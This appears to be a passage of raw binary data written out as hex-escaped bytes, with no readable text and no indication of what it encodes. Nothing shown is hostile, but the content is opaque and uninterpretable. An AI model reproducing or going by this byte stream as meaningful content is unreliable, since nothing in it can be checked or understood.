9\x69\x00\x00\xF9\xF9\xBA\xBA\x17\x17\xD4\xD4\x24\x24\x80\x80\x1E\x1E\x6C\xBB\xBB\x84\x84\x7E\x7E\x24\x24\x41\x41\x81\x81\xBB\xBB\x41\x40\x40\x01\x40\xBC\x40\x01\x85\xA4\xA4\xF1\xF1\xAA\xAA\x04\x20\x2E\x96\x18\x18\x17\x17\x18\x18\xD4\xC1\xC1\x48\x48\xFB\xFB\x79\x79\x27\x27\x79\x79\x87\x87\x9E\x9E\x04\x9D\x0E\x82\x83\x9D\x9D\x04\x18\x01\x85\x3A\x3A\xBC\xBC\x70\x70\x06\x44\x01\x80\x8F\x04\x11\x19\x04\xBE\x03\x04\x7E\x1B\x8A\xF0\xF0\xC8\xC8\x99\x99\x24\x24\x38\x90\x90\x04\xC9\x03\x9C\x2F\x2F\x1C\x1C\x1C\x1C\x14\x14\xA4\xA4\xBE\xBE\x5E\xDE\xDE\x6C\x6C\x00\x00\xE0\xE0\x45\x45\xBD\xBD\xDA\xDA\x31\x31\x04\x40\x01\x90\x3D\x6B\x6B\xBB\xBB\x4A\x4A\x81\x81\x74\x74\xBE\xBE\xBB\xBB\x6A\x6A\x41\x40\x40\x01\x40\xBA\x40\x01\xA9\x40\x40\x67\x67\xAA\xAA\xF5\xF5\x9D\x9D\x47\x47\xC1\xC1\xBF\xBF\xEE\x24\x24\xB9\xB9\xBB\xBB\x81\x81\x79\x79\x54\x54\x6B\x6B\x94\x94\xB3\xB3\x00\x00\xD4\x16\x16\x17\x17\x04\x9A\x3A\x85\x32\x32\xB0\xB0\x0E\x0E\x05\x44\x01\x04\x2B\x01\x81\xC0\xC0\x06\x0D\x28\x87\x99\x99\x62\x62\x8F\x8F\x59\x59\x04\xB0\x08\x99\x51\x09\x09\x52\x52\x14\x14\x0B\x0B\xF2\xF2\x74\x74\xF0\xF0\x5E\x24\x24\x6C\x6C\x1A\x1A\x2B\x2B\x82\x82\x04\x40\x01\x8E\x7E\x7E\x3D\x3D\xC0\xC0\x6C\xBB\xBB\xB3\xB3\x77\x77\xA9\xA9\x41\x40\x40\x01\x40\xC2\x40\x01\x81\x42\x42\x04\xC8\x05\x92\x81\x81\xB6\xB6\x68\x68\xC0\xC0\xD4\xD4\xD8\x9E\x9E\xE1\xE1\xC6\xC6\x92\x92\x04\xA0\x44\x9B\x10\x10\x1C\x1C\xD7\xD7\x3B\x3B\xC1\xF3\xF3\x3C\x3C\xFB\xFB\xC2\xC2\xF5\xF5\x67\x67\x6A\x6A\x32\x32\xDC\xDC\x11\x06\x5A\x10\x83\xEB\xEB\xC0\xC0\x04\x52\x1B\x90\xAA\xAA\x5A\x5A\xAB\xAB\x51\x1C\x1C\x52\x52\x9B\x9B\x50\x50\xBB\xBB\x04\x8F\x20\x8E\xBE\xBE\xF0\xF0\x81\x09\x09\xE0\xE0\x3F\x3F\x28\x28\x35\x35\x04\x06\x23\x96\xB9\xB9\x7F\x7F\x31\x31\xE0\x83\x83\x2D\x2D\xDA\xDA\x7A\x7A\x64\x64\x58\x58\xBB\xBB\x36\x36\x41\x40\x40\x01\x40\xBA\x40\x01\x90\x3A\x3A\x6C\x6C\x5D\x5D\x62\x62\xD4\xD4\x45\x45\xF6\xF6\xDE\xDE\x6C\x04\xD5\x0A\x9C\x21\x21\xF2\xF2\x90\x90\x8F\x8F\xDD\xDD\xE0\xE0\x2B\x2B\x91\x91\xD0\x17\x17\xBA\xBA\xC9\xC9\xC3\xC3\xA2\xA2\xC2\xC2\x04\xAB\x03\x84\x3A\x3A\x0E\x2F\x2F\x04\xD3\x3F\x04\x55\x0B\x85\x8E\x8E\x7B\x7B\xAB\xAB\x05\xB9\x03\x87\x9B\x9B\x13\x13\xBB\xBB\xE1\xE1\x04\x14\x10\x04\xEC\x35\x8C\x77\x77\x6B\xF8\xF8\x6B\x6B\x18\x18\x45\x45\x46\x46\x04\x33\x01\x8E\xB9\xB9\x58\x58\x7E\x7E\xDA\x47\x47\xDF\xDF\x77\x77\x41\x41\x04\xB2\x15\x41\x40\x40\x01\x40\xC0\xC0\x03\x96\xB1\xB1\xFE\xFE\xAE\xAE\xD9\xD9\x24\x24\xDA\xDA\xF6\xF6\xE3\x8F\x8F\x6C\x6C\x7E\x7E\xA4\xA4\x04\xAF\x08\x92\x75\x75\xCE\xCE\xE5\xE5\xD7\xD7\x57\xBA\xBA\x1A\x1A\xFB\xFB\xA5\xA5\xFB\xFB\x05\xD4\x22\x83\xF0\xF4\xF4\x8B\x04\x53\x0B\x85\xDC\xDC\xAC\xAC\x71\x71\x08\x35\x06\x90\x36\x36\x13\xBB\xBB\x6B\x6B\x6B\x6B\x23\x23\xBC\xBC\xB1\xB1\x6C\x6C\x05\x1E\x01\x81\x84\x84\x04\x51\x38\x04\xB1\x03\x8C\xE2\xE2\xB3\xB3\x54\x54\xBE\xBE\x6B\x6B\xDA\x48\x48\x04\xCB\x08\x85\x31\x31\x4A\x4A\x3D\x3D\x40\xBE\x40\x01\x87\xAC\xAC\x3A\x3A\x8E\x8E\xF5\xF5\x04\x27\x07\x9D\xDA\xDA\xD4\xD4\xAD\xB1\xB1\xF4\xF4\x6C\x6C\xE4\xE4\x78\x78\x8F\x8F\x4D\x4D\xEA\xEA\x39\x39\x33\x33\x53\x28\x28\xC1\xC1\x04\x40\x01\x81\xC4\xC4\x04\xD4\x18\x96\xF0\xF0\xB4\xB4\xA8\xDA\xDA\xE0\xE0\x37\x37\x13\x13\xA4\xA4\x0B\x0B\xB7\xB7\xB8\xB8\x40\x40\x05\x3D\x01\x94\x23\x23\x09\x09\xB3\xB3\x49\x49\xD4\xD4\xC9\xC9\x64\x64\xDB\xDB\xB3\x4C\x4C\x9D\x9D\x04\x69\x16\x9A\xD4\xD4\xC7\xC7\x80\x80\xD8\xD8\xBE\xBE\xFA\xFA\xBE\x62\x62\xC9\xC9\x81\x81\x3E\x3E\xFA\xFA\xFA\xFA\xBC\xBC\x41\x40\x40\x01\x40\xBE\x40\x01\xB1\x42\x42\xF2\xF2\x5A\x5A\x99\x99\xDE\xDE\x5E\x5E\xD4\xD4\x6B\x92\x92\x6B\x6B\x7E\x7E\x31\x31\x5E\x5E\x81\x81\xEE\xEE\x17\x17\x19\x19\x8A\x8A\xC5\x17\x17\xE7\xE7\x62\x62\xD1\xD1\x7A\x7A\xDE\xDE\x1B\x1B\x04\x6B\x0C\x9F\xF8\xBA\xBA\xE9\xE9\x83\x83\x6A\x6A\x13\x13\x0B\x0B\x14\x14\xB9\xB9\xF5\xF5\x6C\x6C\x15\x23\x23\xB3\xB3\xE2\xE2\x2A\x2A\xA6\xA6\x04\x6B\x11\x84\xBC\xBC\x37\x37\xD4\x04\xFE\x36\x83\xD4\xD4\xBC\xBC\x06\xE7\x11\x86\xA9\xA9\xE3\xE3\x2E\x2E\xE4\x04\x22\x19\x83\x6C\x6C\xDB\xDB\x04\x12\x22\x81\x40\x40\x04\xC4\x26\x41\x40\x40\x01\x40\xBA\x80\x11\x81\xB1\xB1\x04\xBD\x09\x04\xCD\x0E\x04\x40\x01\x8C\xBC\x22\x22\xBB\xBB\x55\x55\xF4\xF4\x7D\x7D\x77\x77\x04\x59\x1F\x88\x84\x84\x83\x83\x1D\x98\x98\x56\x56\x04\x12\x29\xA3\xA9\xA9\x79\x79\xBB\xBB\x0C\x0C\xDF\xDF\xB3\x88\x88\x91\x91\x4D\x4D\x3A\x3A\xB0\xB0\x0B\x0B\x0B\x0B\x6C\x6C\x31\x31\xB9\xB9\xE0\xE2\xE2\x9C\x9C\x04\xD7\x35\x81\xCA\xCA\x04\x56\x1B\x88\xF2\xF2\x37\x37\xD4\x39\x39\xBE\xBE\x04\x53\x38\x83\x6C\x6C\xC7\xC7\x04\x27\x04\x04\x23\x4B\x8E\x54\x41\x41\xE1\xE1\x1C\x1C\xF8\xF8\xDB\xDB\xB3\xB3\x84\x84\x40\xBC\x80\x0C\x41\x40\x40\x01\x89\x3A\x3A\x78\x78\x5F\x5F\x24\x24\x79\x79\x04\xCD\x18\x84\xDE\xDE\xDD\x83\x83\x04\x3B\x11\x85\x6B\x6B\x6C\x6C\x69\x69\x04\x46\x29\x88\xF8\xF8\xC6\xC6\xC7\x43\x43\xC1\xC1\x04\x21\x33\x94\xC3\xC3\xA5\xA5\xAD\xAD\xF8\xF8\x3C\x3C\xE9\x1D\x1D\x4D\x4D\xA1\xA1\x8E\x8E\x25\x25\x06\x40\x01\x8A\xB9\xB9\xD4\xD4\xB6\x2A\x2A\x28\x28\xBA\xBA\x04\xE7\x13\x9D\x21\x21\xC6\xC6\x6A\x6A\x8B\x8B\x80\xC0\xC0\xB9\xB9\xC6\xC6\x15\x15\x55\x55\x3D\x3D\x24\x24\xEB\xEB\x24\x24\x74\x74\xFA\x04\x84\x01\x87\xF8\xF8\xFA\xFA\x83\x83\xC8\xC8\x04\x47\x41\x41\x40\x40\x01\x40\xBC\x40\x01\x85\x7E\x7E\x99\x99\x54\x54\x04\xF3\x1D\x88\x60\x60\x31\x31\xFC\xE9\xE9\xA1\xA1\x04\xF0\x05\x04\xA3\x18\x8E\x6C\x6C\xC0\xC0\xDB\xDB\xC6\xC6\x15\xC0\xC0\xDA\xDA\x5E\x5E\x04\x40\x01\xA9\xC3\xC3\x64\x64\x65\x65\xCD\xCD\x91\x20\x20\x47\x47\xDD\xDD\x0D\x0D\x85\x85\x10\x10\x0B\x0B\xE1\xE1\x65\x65\x83\x83\xB6\xBA\xBA\xC8\xC8\x83\x83\xB9\xB9\xC9\xC9\x65\x65\x04\x89\x06\x92\x89\x89\xC9\xFB\xFB\x78\x78\x6B\x6B\xE4\xE4\x3D\x3D\x26\x26\x24\x24\xEE\xEE\x04\x59\x06\x8A\xBB\x15\x15\xE0\xE0\x88\x88\x9C\x9C\xCA\xCA\x04\xE3\x0C\x41\x40\x40\x01\x40\xBC\x40\x01\x04\x80\x20\x04\x38\x01\x04\x18\x29\x8A\xFB\xFB\xC9\xC9\x33\x73\x73\x73\x73\xB2\xB2\x06\x44\x01\x04\x03\x01\xB8\xA5\xA5\x6C\x6C\x6B\x54\x54\xC4\xC4\xEE\xEE\x4F\x4F\xA7\xA7\xC3\xC3\x24\x24\x7C\x7C\xC0\xC0\xC1\xE5\xE5\x19\x19\x45\x45\x00\x00\x21\x21\x10\x10\x8B\x8B\x6B\x6B\xBC\xBC\xD4\xD4\x34\x46\x46\xBD\xBD\x83\x83\x4E\x4E\x6C\x6C\xBB\xBB\x04\x89\x0B\x9F\xC7\xC7\x4A\x7E\x7E\x6B\x6B\xDE\xDE\x54\x54\xC7\xC7\x65\x65\xD4\xD4\xD7\xD7\x82\x82\xDB\xDB\xC7\x35\x35\x1D\x1D\x44\x44\x1D\x1D\x04\x57\x0B\x40\xBE\x00\x14\x41\x40\x40\x01\x85\x85\x85\xBC\xBC\xBB\xBB\x04\xBA\x0D\x81\x22\x22\x04\x66\x4D\x88\xC0\xF0\xF0\x57\x57\xCE\xCE\xA3\xA3\x08\x44\x01\x88\xC0\xC0\xFD\xFD\xAE\x1F\x1F\xA9\xA9\x04\xB4\x27\x04\x36\x16\x84\xDA\xDA\x7C\x7C\x24\x04\x4D\x06\x83\x1A\x1A\xBD\xBD\x04\x45\x00\x81\x0B\x0B\x06\x40\x01\x8C\xB3\xB3\x56\xBD\xBD\x45\x45\xD4\xD4\xB9\xB9\xB1\xB1\x04\xD6\x20\x94\x7E\x7E\x84\x84\xBB\x65\x65\xDB\xDB\xE4\xE4\x4A\x4A\xBB\xBB\xF8\xF8\x83\x83\xD3\xD3\x04\x55\x2E\x88\xDA\x61\x61\xE5\xE5\x6D\x6D\xCA\xCA\x04\x11\x14\x81\xDB\xDB\x40\xBC\x40\x0B\x41\x40\x40\x01\x04\x00\x23\x04\x59\x03\x06\x37\x06\x99\xC0\xC0\xC0\x01\x01\xEE\xEE\x63\x63\x20\x20\xD7\xD7\x72\x72\x93\x93\x8A\x8A\xDE\xDE\xFB\xFB\xA5\x81\x81\x04\x3C\x06\x04\x25\x2E\x87\x74\x74\xBA\xBA\xBA\xBA\xF6\xF6\x04\x82\x0D\x95\xFB\xC0\xC0\x0D\x0D\x21\x21\xB7\xB7\x66\x66\xBB\xBB\x65\x65\xB3\xB3\xCD\x83\x83\xB3\xB3\x04\xCB\x08\x81\xB9\xB9\x04\x45\x19\x04\x66\x1B\x80\x92\x04\x58\x01\x83\xF4\xF4\xB9\xB9\x04\x0E\x04\x92\xD4\xD4\x17\x17\xB3\xB3\xF8\xF8\xB3\x2A\x2A\xCD\xCD\x48\x48\x6E\x6E\xE0\xE0\x04\xEA\x03\x40\xBC\x40\x10\x41\x40\x40\x01\x04\xC0\x08\xA5\x31\x31\xDA\xDA\x93\x93\x96\x96\x8A\x8A\xC8\xC8\x4F\x24\x24\x48\x48\x39\x39\xE6\xE6\x1D\x1D\x20\x20\xCE\xCE\x93\x93\x5E\x5E\xB9\xB9\x54\xB4\xB4\xC0\xC0\x04\x55\x33\x94\xA9\xA9\x7D\x7D\x33\x33\xD5\xD5\x1A\x1A\x9F\xA5\xA5\xC2\xC2\xC0\xC0\xD9\xD9\x0F\x0F\x04\x40\x0B\x06\x40\x01\x88\xE6\xD4\xD4\x6C\x6C\x2E\x2E\xBB\xBB\x04\x02\x19\x8A\xBB\xBB\x92\x92\x65\x65\xB3\xC5\xC5\x43\x43\x06\x4F\x01\x85\x21\x21\xB3\xB3\x47\x47\x05\x40\x01\x87\xE2\xE2\x83\x83\x1A\x1A\x2D\x2D\x04\x11\x28\x04\x00\x23\x81\xA8\xA8\x41\x40\x40\x01\x40\xBC\x40\x01\x81\xA2\xA2\x04\x57\x44\x81\x8A\x8A\x04\x93\x08\x80\xEE\x04\xE4\x0A\x87\x17\x17\x53\x53\xC8\xC8\xCA\xCA\x04\xA4\x0D\x88\x5E\x5E\x71\x71\x7E\x6B\x6B\x77\x77\x04\xDB\x03\x04\xD4\x2C\x88\xEE\xEE\x6D\x6D\x82\x82\x5D\xD8\xD8\x04\xEF\x0D\x83\x12\x12\x0E\x0E\x04\x40\x0B\x86\xBB\xBB\x3A\x3A\xB3\xB3\x86\x04\xBC\x08\x85\xC7\xC7\xA8\xA8\x15\x15\x06\x1C\x10\x92\xCD\xCD\x4C\xD6\xD6\xDD\xDD\xB9\xB9\x78\x78\x50\x50\xF8\xF8\xD4\xD4\x34\x34\x04\x40\x01\x84\xE0\x83\x83\x83\x83\x04\xEC\x03\x83\x4E\x4E\xC0\xC0\x04\x00\x23\x81\x52\x52\x41\x40\x40\x01\x40\xBC\x40\x01\x04\x85\x3F\x04\x91\x08\x99\xDF\xDF\x39\x39\xEE\xC0\xC0\x62\x62\xDA\xDA\xCD\xCD\x28\x28\x34\x34\xDD\xDD\xCB\xCB\xD8\xD8\x24\x24\x6C\x04\xFB\x00\x83\x4B\x4B\xEE\xEE\x06\xC2\x0D\x04\xF5\x31\x80\xD8\x04\x78\x2A\x85\xB4\xB4\x12\x12\x12\x12\x04\x40\x01\x04\x75\x5C\x82\xB3\xB3\xE7\x04\x60\x06\x04\x77\x47\x94\xF8\xF8\xB3\xB3\xDD\xDD\x4C\x4C\x2A\x2A\x39\xC5\xC5\x46\x46\x3E\x3E\xE4\xE4\xA8\xA8\x04\xC0\x03\x92\xEE\xEE\x1B\x1B\x92\x92\xE0\xE7\xE7\xE8\xE8\xAD\xAD\xB9\xB9\x1F\x1F\x81\x81\x04\x40\x13\x81\x25\x25\x40\xBA\x80\x0C\x06\x4C\x21\x04\x18\x51\x04\xDA\x18\x90\xEE\x62\x62\xA5\xA5\x31\x31\xEE\xEE\x2B\x2B\x86\x86\xCB\xCB\x47\x47\x04\x26\x29\x80\x4A\x04\x40\x01\x83\x91\x91\x5C\x5C\x04\xD9\x26\x04\x99\x39\x88\x9F\x9F\x9F\x87\x87\xD1\xD1\x77\x77\x08\x40\x01\x90\x8D\x8D\xAB\xAB\xC7\xC7\xB9\xB9\xB9\xB3\xB3\x7C\x7C\xE0\xE0\xCD\xCD\x04\x86\x34\x8C\x18\x18\x47\x47\xDF\x83\x83\xD4\xD4\x54\x54\x27\x27\x04\xD7\x1C\x8C\xB4\xB4\xEE\xEE\x74\x74\x65\x65\xB3\x2D\x2D\x1A\x1A\x04\xC9\x1C\x04\x40\x01\x04\xD5\x4E\x41\x40\x40\x01\x40\xBC\x40\x01\x89\xB1\xB1\xB3\xB3\xB3\xB3\xA5\xA5\xA5\xA5\x05\xA3\x40\xA2\xC3\xC3\x87\x87\xC9\xC9\x6E\x6E\xB6\xB6\x18\x18\x43\x43\xC5\xC5\xD8\xD8\xA2\xA2\x2E\x22\x22\xB3\xB3\xA3\xA3\xA1\xA1\x31\x31\x3E\x3E\x2E\x2E\x04\xCF\x4F\x88\x9E\x62\x62\x81\x81\x81\x81\x0E\x0E\x04\x40\x01\x04\xFC\x4F\xBC\x81\x81\x78\x78\x12\x6C\x6C\x55\x55\x5E\x5E\x19\x19\x98\x98\x28\x28\x33\x33\xC1\xC1\x46\x46\x83\x88\x88\x83\x83\x41\x41\x6F\x6F\x89\x89\xAD\xAD\x77\x77\x5E\x5E\xC7\xC7\x55\x55\xD4\x49\x49\xE8\xE8\x89\x89\xFA\xFA\x1B\x1B\x24\x24\x71\x71\x8D\x8D\x40\xBE\x40\x3D\x41\x40\x40\x01\xAD\xE0\xE0\xB3\xB3\x5D\x5D\x5E\x5E\xA5\xA5\x99\x99\x5D\x60\x60\x87\x87\x31\x31\xF6\xF6\x33\x33\x3C\x3C\x18\x18\x6D\x6D\xD8\xD8\x9E\x9E\x4A\xF2\xF2\xE0\xE0\x63\x63\xC8\xC8\x24\x24\x62\x62\x04\xCB\x09\x8C\x7E\x7E\xE4\x87\x87\xDE\xDE\x41\x41\x0E\x0E\x0E\x0E\x04\x80\x1B\xB4\x89\x89\x77\x77\x78\x78\xF4\xBE\xBE\x6C\x6C\xD4\xD4\x63\x63\x45\x45\x6E\x6E\x46\x46\x83\x83\x35\x35\x88\x82\x82\x83\x83\x1B\x1B\x6F\x6F\x55\x55\x26\x26\x26\x26\xB9\xB9\x84\x84\xFA\xFA\xB3\x83\x83\x7D\x7D\xFA\xFA\x04\x61\x14\x85\xD8\xD8\xFA\xFA\x6A\x6A\x40\xBA\x00\x0A\x41\x40\x40\x01\x04\x80\x11\x85\x6C\x6C\x84\x84\x6F\x6F\x04\x72\x5D\xB0\xC0\xC0\x9F\x9E\x9E\x87\x87\x74\x74\xE4\xE4\xC0\xC0\xEE\xEE\x18\x18\x39\x39\xD8\xD8\xA9\xA9\x7A\x30\x30\xB3\xB3\x2C\x2C\xBD\xBD\x65\x65\x55\x55\xB3\xB3\xDB\xDB\xF8\xF8\x23\x26\x26\xA9\xA9\x3E\x3E\x06\x40\x01\x83\x0B\x0B\x3D\x3D\x04\x87\x38\x84\xD8\x5E\x5E\xAF\xAF\x04\xC6\x1B\x04\x92\x38\x81\x45\x45\x04\xE2\x0E\x82\x6E\x56\x56\x06\x40\x01\x83\x26\x26\x55\x55\x04\xA6\x11\x84\xFA\xFA\xD4\xD4\xD8\x04\x34\x27\x87\x84\x84\xDA\xDA\x83\x83\x49\x49\x40\xBE\x80\x16\x41\x40\x40\x01\x06\xC0\x35\x04\xD5\x5A\x8A\xBC\xBC\xC2\xC2\x87\x87\xC3\xC3\xC3\x9F\x9F\x06\x85\x3A\x90\xC0\xC0\x3B\x3B\xE5\xE5\xD8\xD8\xC4\xC4\x79\xC9\xC9\x5E\x5E\x6D\x6D\x04\xD4\x45\x87\x09\x09\xBF\xBF\xA1\xA1\x74\x74\x05\x5F\x0C\x81\x58\x58\x04\x40\x01\x85\x10\x10\x13\x13\x25\x25\x04\x41\x19\x84\xEE\x64\x64\x2E\x2E\x04\x8D\x43\x04\xDF\x62\x81\xD4\xD4\x04\x75\x25\x80\x1A\x04\x7C\x25\x87\x58\x58\x58\x58\xAD\xAD\x69\x69\x04\x9B\x11\x8C\xDA\xDA\xE6\xE6\xEE\x78\x78\x6C\x6C\xE8\xE8\x4C\x4C\x04\x43\x19\x81\xC7\xC7\x41\x40\x40\x01\x40\xBC\x40\x01\x87\x37\x37\xD4\xD4\x9C\x9C\xFA\xFA\x04\x0E\x00\x04\x53\x11\x80\x9F\x04\xA1\x0D\x8B\x9F\x9F\x60\x60\xC2\xC2\xA5\xA5\x53\x53\x1D\x1D\x04\x40\x01\x84\x77\x1E\x1E\x60\x60\x04\x38\x60\x8A\xBB\xBB\x1C\x1C\x2A\x2A\xE9\xE9\x75\x75\xCA\x04\xE9\x13\x83\x7E\x7E\x0F\x0F\x04\x40\x01\x81\x10\x10\x04\x3F\x19\x8E\x6B\x6B\xBC\x1C\x1C\x31\x31\x24\x24\x1E\x1E\x3E\x3E\x74\x74\x04\xEE\x3F\x84\x49\x49\x46\xE7\xE7\x04\x40\x01\x04\xC0\x03\x8A\x6B\x6B\xAD\xAD\x78\x78\xD4\xD4\xDD\xDD\xD8\x04\xF4\x16\x83\x17\x17\x2C\x2C\x04\xFE\x45\x81\xBC\xBC\x40\xBC\x00\x19\x41\x40\x40\x01\x04\x40\x01\x87\x91\x91\x4B\x4B\x1A\x1A\xBB\xBB\x04\x00\x19\x80\xDE\x04\x70\x16\x89\xFB\xFB\xFE\xFE\xEE\xEE\xFE\xFE\x2D\x2D\x04\x74\x35\x84\x62\x62\x7A\x1F\x1F\x04\xA0\x20\x92\x99\x99\x6B\x6B\xB9\xB9\xCB\xCB\x95\x95\xCE\xCE\xF3\x2C\x2C\xE8\xE8\xB3\xB3\x04\xCF\x30\xA9\x10\x10\x14\x14\xB5\xB5\xF5\xF5\xBB\xBB\xC6\x22\x22\xE4\xE4\xB3\xB3\x1E\x1E\x27\x27\x1E\x1E\x41\x41\xD4\xD4\xB3\xB3\xD4\x49\x49\x35\x35\x6F\x6F\x2E\x2E\x6B\x6B\x65\x65\x04\xB1\x0D\x8A\x5E\x5E\xD8\xD8\x7C\x65\x65\x6B\x6B\xCD\xCD\x04\x2A\x19\x04\x00\x19\x81\x52\x52\x41\x40\x40\x01\x40\xBC\x40\x01\x04\x7C\x16\x8C\xB2\xB2\xF3\xF3\xD7\xD7\xC1\xC1\xA0\xA0\xE4\x74\x74\x04\xED\x18\x81\xD1\xD1\x04\x6F\x1B\x04\x9A\x35\x8C\x4F\x4F\x77\x77\x77\x81\x81\xF5\xF5\x62\x62\xFE\xFE\x04\x40\x01\x8E\x83\x83\x68\x68\x44\x44\x4B\x20\x20\xBF\xBF\xC8\xC8\xB0\xB0\x04\x00\x23\x9B\x30\x30\x2E\x2E\x4F\x4F\x23\x23\xF2\xB3\xB3\x56\x56\x88\x88\x24\x24\x27\x27\x80\x80\x89\x89\x78\x78\x71\x71\xD4\x04\x8B\x2A\x83\x31\x31\x27\x27\x04\x99\x2A\x8A\x58\x58\xC0\xC0\x4E\x4E\x89\x89\x26\xBB\xBB\x04\x6D\x10\x85\x37\x37\xB9\xB9\x4A\x4A\x40\xBE\x40\x3D\x41\x3E\x40\x01\x9E\x0D\x0D\x32\x32\x8F\x8F\xEE\xEE\x9D\x9D\x4B\x4B\xCE\xCE\x61\x61\x57\x57\xD4\x24\x24\x7A\x7A\xB4\xB4\xDE\xDE\xA0\xA0\xD8\xD8\x06\x0A\x50\x8A\x9F\x9F\xB4\xBE\xBE\xE4\xE4\x8F\x8F\x4E\x4E\x04\x35\x06\x88\x6E\x6E\xC8\xC8\xDD\xDD\x3C\x34\x34\x04\x62\x15\x06\x40\x01\x8C\x14\x14\xF5\xF5\x31\x31\xE0\xE0\xC8\x17\x17\x2D\x2D\x04\x15\x4B\x98\x3E\x3E\x3D\x3D\x6C\x6C\x7F\x7F\x24\x24\xDA\xD4\xD4\xA7\xA7\xE4\xE4\x24\x24\xE0\xE0\xE6\xE6\xEE\xEE\x04\x99\x52\x90\x74\x74\x89\xC7\xC7\xE0\xE0\xDB\xDB\xBC\xBC\xF4\xF4\x5E\x5E\x6B\x6B\x40\xBA\x40\x06\x41\x40\x40\x01\x81\x59\x59\x04\xC0\x35\x92\x31\x31\x87\x87\x2B\x2B\xD6\xD6\x2A\x2A\xD5\xD5\x46\xC0\xC0\xF5\xF5\xF4\xF4\x05\xDF\x1D\x84\xFB\x79\x79\xEE\xEE\x04\x31\x74\x88\x3E\x84\x84\xE3\xE3\x24\x24\xF4\xF4\x04\x86\x25\x90\x45\x45\xCB\xCB\x39\x39\x19\xD4\xD4\xDE\xDE\x83\x83\xAC\xAC\x12\x12\x06\x00\x28\x86\x0C\x0C\x83\x83\xCE\x3B\x3B\x04\x38\x0B\x04\x16\x3D\x92\x69\x69\xAD\xAD\x64\x64\xB4\xB4\x79\xFE\xFE\xF6\xF6\x7E\x7E\xE1\xE1\x18\x18\x04\xD6\x61\x8E\x24\x24\xB3\xB3\x31\x31\x58\xC7\xC7\xC7\xC7\x6C\x6C\x1B\x1B\x04\x4D\x06\x40\xBC\x40\x01\x04\xCA\x77\x04\x2D\x01\x8A\xEE\xEE\x28\x28\xCA\xCA\x6D\x6D\x3F\x3F\xEE\x04\x0C\x7E\x04\x6F\x11\x04\x0F\x0F\x9D\xE4\xE4\x3E\x3E\x1F\x1F\xA5\xA5\x24\xF8\xF8\x4A\x4A\x87\x87\xC4\xC4\x5E\x5E\xE0\xE0\x49\x49\x3C\x3C\x83\x83\xC8\x83\x83\x04\x67\x0C\x06\x00\x0A\x04\x40\x1A\xB4\x15\x15\xD4\xD4\x86\xD4\xD4\xFE\xFE\xA5\xA5\x7D\x7D\xCC\xCC\x2E\x2E\x4E\x4E\xB4\xB4\x5E\x5E\xDA\x5E\x5E\x89\x89\x65\x65\xE1\xE1\x34\x34\x1D\x1D\x6E\x6E\x1A\x1A\xD4\xD4\x71\x71\x78\xE0\xE0\x6F\x6F\xB4\xB4\x77\x77\x04\x11\x14\x40\xBC\x40\x24\x41\x40\x40\x01\x81\x38\x38\x04\xBA\x62\x04\x4B\x70\x04\xAD\x1C\x86\x34\x34\x18\x18\xDF\xF7\xF7\x04\x6B\x3E\x83\xE0\xE0\x33\x33\x04\xB8\x18\x83\x62\x62\xAD\xAD\x04\x9A\x26\x80\xD4\x04\x5A\x70\x92\x99\x99\xBA\xBA\xEE\xEE\xDD\xDD\x20\x20\xD8\xD8\x7E\x5E\x5E\x62\x62\xE3\xE3\x06\x00\x0F\x04\x40\x01\x84\x6B\x6B\x74\x74\x78\x04\xFD\x1C\x89\xF6\xF6\xC9\xC9\xE3\xE3\xE3\xE3\xC9\xC9\x04\x22\x01\x82\x6F\x6C\x6C\x04\xA3\x21\x89\x6B\x6B\x33\x33\x17\x17\xCD\xCD\xDF\xDF\x05\x15\x0A\x8B\x1F\x1F\x27\x27\x81\x81\xBE\xBE\x94\x94\x54\x54\x40\xBC\x80\x43\x41\x40\x40\x01\x8D\x01\x01\x08\x08\x24\x24\xD1\xD1\xE4\xE4\x27\x27\x83\x83\x04\x6F\x16\x80\x49\x04\x9D\x35\xA9\xF2\xF2\xC7\xC7\x49\x49\x1A\x1A\x84\x84\x7C\x7C\x6C\x6C\x23\x23\xDD\x91\x91\xDD\xDD\x24\x24\x5D\x5D\xA1\xA1\x53\x53\xEE\xEE\xE7\xE7\xD4\xD4\x24\xDE\xDE\x9E\x9E\xC0\xC0\x04\x40\x1F\x04\x00\x0A\x81\x6C\x6C\x04\xD8\x4A\x86\x78\xB4\xB4\xDA\xDA\x3E\x3E\x04\xEE\x5D\x96\xC9\xC9\x89\x89\x1B\x1B\xC9\xC9\x7F\x89\x89\x6C\x6C\x92\x92\x92\x92\x33\x33\x2B\x2B\x45\x45\x04\x37\x1F\x90\x45\x45\x83\x7E\x7E\xB3\xB3\xBE\xBE\x6F\x6F\x1E\x1E\xDE\xDE\xB9\xB9\x40\xBA\xC0\x03\x41\x40\x40\x01\x04\xAB\x58\x89\x08\x08\xF4\xF4\xA9\xA9\xCC\xCC\x81\x81\x04\x82\x43\x80\xC1\x04\x36\x5B\x85\xF9\xF9\xB3\xB3\xC5\xC5\x04\x1B\x4D\x04\x76\x26\x88\x22\x22\x88\xE9\xE9\x3C\x3C\x24\x24\x04\x84\x11\x81\xA1\xA1\x04\xEE\x30\x84\x77\x77\xBE\x62\x62\x04\x84\x1B\x06\x40\x01\x81\x14\x14\x04\x89\x21\x84\x1E\x1E\x80\x64\x64\x04\x5F\x3E\x9E\xC0\xC0\xE3\xE3\xF4\xF4\xFA\xFA\x78\x78\x31\x31\x69\xE1\xE1\xBC\xBC\xF2\xF2\x92\x92\x34\x34\x43\x43\x48\x48\x46\x46\x48\x48\x04\x7F\x01\x84\xD4\x48\x48\xB3\xB3\x04\x74\x00\x83\x6C\x6C\x50\x50\x40\xBA\x40\x29\x41\x40\x40\x01\x04\xA8\x4A\x81\x08\x08\x04\xED\x40\x04\x3E\x3D\x8E\x44\x44\xBF\xBF\xEE\xFD\xFD\x77\x77\x00\x00\xD4\xD4\x44\x44\x04\x1B\x16\x81\xBB\xBB\x04\xDA\x13\x84\xD4\xE9\xE9\x68\x68\x04\x22\x23\x04\x41\x20\x88\x4F\x4F\x9F\x9F\xC0\xC0\xB3\x79\x79\x04\x40\x01\x81\x13\x13\x06\x40\x01\xB0\x7F\x7F\x89\x89\xC7\xC7\x81\x81\x81\x27\x27\xE3\xE3\x4A\x4A\xFA\xFA\xC7\xC7\x69\x69\x6F\x6F\xD4\xD4\xE0\xA8\xA8\x65\x65\xF2\xF2\x65\x65\x56\x56\x48\x48\x88\x88\x6E\x6E\xE8\xE8\x35\x35\x82\x45\x45\x04\x90\x5B\x04\x62\x38\x85\x6A\x6A\x30\x30\x13\x13\x40\xB8\x80\x1B\x41\x40\x40\x01\x87\x00\x00\x8E\x8E\x01\x01\x65\x65\x04\x06\x00\x86\x8F